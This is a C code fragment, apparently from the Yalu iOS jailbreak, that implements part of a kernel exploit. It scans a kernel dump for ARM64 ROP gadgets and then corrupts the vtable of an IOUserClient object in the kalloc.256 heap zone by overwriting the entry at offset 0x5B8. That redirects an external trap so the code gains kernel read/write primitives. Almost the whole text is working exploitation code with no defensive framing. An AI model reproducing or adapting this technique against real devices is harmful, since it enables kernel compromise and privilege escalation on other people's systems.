/* in exploit, after dumping the kernel */

uint64_t add_x0_432 = (uint64_t)memmem(kernel.kern_dump, kernel.kern_size, (&(char[]){0x00, 0xc0, 0x06, 0x91, 0xC0, 0x03, 0x5F, 0xD6}), 8);
if (!add_x0_432) {
    assert(!"Missing Gadget");
}
add_x0_432 -= (uint64_t) kernel.kern_dump;


uint64_t br_x6 = (uint64_t)memmem(kernel.kern_dump, kernel.kern_size, (&(char[]){0xc0, 0x00, 0x1f, 0xd6}), 4);
if (!br_x6) {
    assert(!"Missing Gadget");
}
br_x6 -= (uint64_t) kernel.kern_dump;

/* in exploit, after having gotten r/w access to a kalloc.256 IOUserClient object (with controlled adjacent allocation) */

uint64_t externalTrap[2];
externalTrap[0] = 0x13371337;
externalTrap[1] = br_x6 + kernel.kern_base;

/* in exploit, after writing externalTrap in the controlled adjacent allocation + 432 - 256 */

uint64_t io_vtable[4096/8];

/* in exploit, after reading object's vtable into io_vtable */

io_vtable[0x5B8 / 8] = add_x0_432 + kernel.kern_base;

/* write vtable into kernel heap and replace IOUserClient vtable pointer to the new vtable */

struct YaluPrimitives* prim;
IOExternalTrapPrimitivesFromKernelAndSmashedClient(&prim, &kernel, my_kalloc256_userclient_port);

printf("kernel mach header magic: %08x\n", prim.read32(&prim, kernel.kern_base));

//
//  YaluKernel.h
//  Copyright © 2016 qwertyoruiop. All rights reserved.
//

#ifndef YaluKernel_h
#define YaluKernel_h

struct YaluKernel {
    vm_address_t kern_base;
    uint8_t* kern_dump;
    vm_size_t kern_size;
};

#endif /* YaluKernel_h */
